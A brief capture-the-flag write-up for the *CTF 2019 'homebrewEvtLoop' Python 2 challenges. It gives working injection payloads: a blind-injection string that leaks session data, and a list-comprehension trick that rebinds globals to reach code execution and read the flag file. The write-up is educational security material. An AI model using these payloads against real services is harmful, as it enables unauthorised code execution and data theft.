# [*CTF 2019 Misc] `homebrewEvtLoop--` and `homebrewEvtLoop#`

An interesting python2 challenge. You may find some techniques here similar to those in SQL injection.

## Problem

Please find the `server.py`.

## Solution
 
#### stage 1 (Blind injection)
```python
session[args[0]][52]in[event[8]][0]and[dir][0]or[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789]114514log
```

Blind injection by changing the indexes, `[52]` of `session[args[0]]`(`session['log']`) and `[8]` of `event`, with reusing the submitted string `event` as alphabet.     

Alternatively, you can use `valid_event_chars` as alphabet, or get the flag directly by using a `list comprehension exploit` of stage 2 like `[[str][0]for[args]in[[session]]][0]114514`.

#### stage 2 (Remote Code Execution)
```python
[[str]for[PoW]in[[switch_safe_mode]]for[raw_input]in[[input]]][0][0]114514
['[[str]for[args]in[[session]]][0][0]114514' for session in [open('flag','rb').read()]][0]
```

This is a feature of python2, that list comprehension could be used as assignments to global variables.

## Related Challenges

`DDCTF 2019` - Web: `homebrew event loop`
